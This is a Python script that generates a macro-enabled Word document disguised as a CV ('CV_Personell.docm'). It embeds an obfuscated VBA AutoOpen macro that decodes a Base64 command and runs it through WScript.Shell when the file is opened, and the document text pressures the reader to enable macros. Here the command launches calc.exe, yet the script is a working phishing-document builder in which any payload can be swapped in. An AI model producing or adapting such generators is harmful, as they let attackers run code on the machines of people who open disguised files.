import os
import win32com.client
import base64

# Function to obfuscate strings
def obfuscate_string(s):
    return base64.b64encode(s.encode()).decode()

# Create a new Word application
word = win32com.client.Dispatch('Word.Application')
word.Visible = False

# Add a new document
doc = word.Documents.Add()

# Write some text to the document
doc.Range().Text = "This document contains a macro that will execute a command when opened.\n\n"
doc.Range().InsertAfter("Please enable macros to allow functionality.\n")
doc.Range().InsertAfter("This is an advanced example demonstrating how to execute commands using VBA.\n")

# Obfuscated VBA code
vba_code = """
Sub AutoOpen()
    Dim oShell As Object
    Set oShell = CreateObject("WScript.Shell")
    
    ' Obfuscated command to run calc.exe
    Dim command As String
    command = Decode("QzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZQ==") ' Base64 encoded path to calc.exe
    oShell.Run command
End Sub

Function Decode(ByVal encodedString As String) As String
    Dim arr() As Byte
    arr = Base64Decode(encodedString)
    Decode = StrConv(arr, vbUnicode)
End Function

Function Base64Decode(ByVal encodedString As String) As Byte()
    Dim objXML As Object
    Dim objNode As Object
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.text = encodedString
    Base64Decode = objNode.nodeTypedValue
End Function
"""

# Add VBA code to the document
vba_module = doc.VBProject.VBComponents.Add(1)  # 1 = Module
vba_module.Name = "ObfuscatedModule"
vba_module.CodeModule.AddFromString(vba_code)

# Define the path for saving the document
save_path = os.path.join(os.getcwd(), "CV_Personell.docm")

# Save the document as a macro-enabled file
doc.SaveAs(save_path, FileFormat=13)  # 13 = wdFormatXMLDocumentMacroEnabled

# Clean up
doc.Close(SaveChanges=True)
word.Quit()

print(f"[+] Document saved as : {save_path}")
